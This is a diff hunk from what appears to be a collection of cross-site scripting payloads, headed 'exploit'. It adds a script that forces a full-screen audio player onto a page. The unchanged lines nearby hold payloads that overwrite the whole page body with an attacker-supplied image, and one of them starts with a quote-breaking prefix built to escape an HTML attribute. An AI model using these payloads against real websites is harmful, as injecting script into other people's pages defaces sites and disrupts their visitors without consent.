@@ -88,6 +88,18 @@ exploit :
   document.body.appendChild(video);
 </script>
 
+<script>
+  var audio = document.createElement("audio");
+  audio.src = "https://example.com/your-audio-file.mp3";
+  audio.controls = true;
+  audio.style.position = "fixed";
+  audio.style.left = "0";
+  audio.style.top = "0";
+  audio.style.width = "100%";
+  audio.style.zIndex = "9999";
+  document.body.appendChild(audio);
+</script>
+
 <script>document.body.innerHTML=" <img src='SITE THAT HAVE YOUT IMG' >"</script>
 
 '"<script>document.body.innerHTML=" <img src='SITE THAT HAVE YOUT IMG' >"</script>
